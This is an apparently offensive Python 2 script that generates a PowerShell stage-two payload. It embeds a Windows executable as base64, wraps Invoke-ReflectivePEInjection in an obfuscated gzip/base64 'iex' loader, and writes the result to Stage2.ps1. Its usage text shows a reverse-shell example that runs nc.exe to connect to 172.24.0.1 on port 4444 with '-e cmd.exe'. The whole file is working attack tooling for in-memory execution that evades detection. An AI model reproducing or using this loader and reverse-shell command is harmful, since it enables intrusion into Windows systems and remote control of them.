import sys

if len(sys.argv) != 3:
	print "\r\nUsage Examples:\r\n"
	print "[+] Using Args: " + sys.argv[0] + " /usr/share/windows-binaries/nc.exe \"172.24.0.1 4444 -e cmd.exe\"\r\n"
	print "[+] No Args: " + sys.argv[0] + " /usr/share/windows-binaries/nc.exe \"\"\r\n"
	sys.exit()

PE_FILE = sys.argv[1]
PE_ARGS = sys.argv[2]

def gzipstream(data):
        import zlib
        gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS + 16) # compatible to Windows GZipStream
        gzip_data = gzip_compress.compress(data) + gzip_compress.flush()
        return gzip_data

def b64encode(data):
        import base64
        return base64.b64encode(data)

def b64gzip(data):
        return b64encode(gzipstream(data))


def out_PS_IEX_Invoker(ps_script):
	b64 = b64gzip(ps_script)
	return "$b='{0}';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(b64)


def get_bytes_from_file(filename):
	EncData = b64encode(open(filename, "rb").read())
	return "$c='{0}';".format(EncData)


with open("Invoke-ReflectivePEInjection.ps1","rb") as f:
	ps_script = out_PS_IEX_Invoker(f.read())
	if PE_ARGS:
		ps_script += get_bytes_from_file(PE_FILE) + "$TEST = [System.Convert]::FromBase64String($c);$PEBytes = $TEST;Invoke-ReflectivePEInjection -PEBytes $TEST -ExeArgs " + '"' + PE_ARGS + '"' + " -Verbose"
	else:
		ps_script += get_bytes_from_file(PE_FILE) + "$TEST = [System.Convert]::FromBase64String($c);$PEBytes = $TEST;Invoke-ReflectivePEInjection -PEBytes $TEST -Verbose"

file = open("Stage2.ps1","w")  
file.write(ps_script ) 
file.close() 
print "\r\n[+] Payload written to Stage2.ps1"






